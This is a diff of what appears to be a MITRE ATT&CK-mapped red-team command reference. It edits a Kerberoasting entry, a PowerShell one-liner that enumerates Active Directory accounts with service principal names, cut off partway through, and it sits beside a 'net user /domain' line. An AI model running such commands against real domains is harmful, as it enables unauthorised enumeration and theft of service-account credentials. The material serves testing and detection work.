@@ -205,7 +205,7 @@ net user <username> /domain
 Steal or Forge Kerberos Tickets: Kerberoasting [[T1558.003](https://attack.mitre.org/techniques/T1558/003/)]
 
 ```
-$Null = [Reflection.Assembly]::LoadWithPartialName( 'System.IdentityModel' ); $search = New-Object DirectoryServices.DirectorySearcher( [ADSI]'' ); $search.filter = '(&(servicePrincipalName=*)(objectCategory=user))'; $results = $search.Findall(); foreach ( $results in $results ) { $u = $results.GetDirectoryEntry(); 
+powershell.exe $Null = [Reflection.Assembly]::LoadWithPartialName( 'System.IdentityModel' ); $search = New-Object DirectoryServices.DirectorySearcher( [ADSI]'' ); $search.filter = '(&(servicePrincipalName=*)(objectCategory=user))'; $results = $search.Findall(); foreach ( $results in $results ) { $u = $results.GetDirectoryEntry(); 
 samAccountName = $u.samAccountName; foreach ( $s in $u.servicePrincipalName )
 ```
 <br>
